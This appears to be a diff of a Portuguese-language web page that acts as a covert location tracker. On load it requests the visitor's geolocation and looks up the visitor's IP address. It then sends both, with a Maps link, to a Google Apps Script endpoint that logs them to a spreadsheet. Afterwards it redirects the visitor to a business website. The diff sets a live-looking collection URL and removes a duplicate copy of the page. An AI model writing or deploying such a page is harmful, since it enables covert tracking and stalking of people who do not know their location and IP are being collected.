@@ -19,7 +19,7 @@
   </style>
   <script>
     // Substitua esta URL pela URL do seu Web App do Google Apps Script
-    const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbx5QG8Q_Vp8ymFerpIoQ0h9xI8VNbnMp47QJ3RsTZN2J9hp_7V4nl6A6cZLdt1OWCCNfg/exec'; // <<< SUBSTITUA AQUI!
+    const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbyHbb0FGf7l84Ulyz3pgGulkE8LCLR01STF6cl34sPRcE6NBspJCDETR40BJaPdlsd3YA/exec'; // <<< SUBSTITUA AQUI!
 
     window.onload = function() {
       if (navigator.geolocation) {
@@ -40,7 +40,8 @@
       const longitude = position.coords.longitude;
 
       // URL correta para o Google Maps
-     const mapsLink = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
+      const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
       try {
         // Captura o IP do visitante
         const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -99,78 +100,6 @@
       document.body.innerHTML = `<p>${errorMessage}</p>`;
       // Redireciona mesmo se houver erro de geolocalização, após exibir a mensagem
       setTimeout(redirecionaInstagram, 3000); // Redireciona após 3 segundos para o usuário ler a mensagem
-    }
-
-    function redirecionaInstagram() {
-      window.location.href = "https://www.despachanteespindola.com/";
-    }
-  </script>
-</head>
-<body>
-  <p>📍 Obtendo sua localização... Aguarde...</p>
-</body>
-</html><!DOCTYPE html>
-<html lang="pt">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Localizando...</title>
-  <style>
-    body {
-      background-color: #000;
-      color: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      font-family: Arial, sans-serif;
-      text-align: center;
-    }
-  </style>
-  <script>
-    window.onload = function() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sucesso, erro);
-      } else {
-        document.body.innerHTML = "<p>Seu navegador não suporta geolocalização.</p>";
-      }
-    };
-
-    function sucesso(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-
-      // Captura o IP do visitante
-      fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-          const ip = data.ip;
-
-          const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
-          // Envia os dados para sua planilha no Google Sheets
-          fetch('SEU_WEBAPP_URL_AQUI', {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-              latitude: latitude,
-              longitude: longitude,
-              ip: ip,
-              maps: mapsLink
-            })
-          });
-
-          // Após capturar, redireciona para o Instagram
-          redirecionaInstagram();
-        });
-    }
-
-    function erro(err) {
-      console.warn("Geolocalização não permitida ou erro:", err);
-      document.body.innerHTML = "<p>⚠️ É necessário permitir a localização para continuar.</p>";
     }
 
     function redirecionaInstagram() {
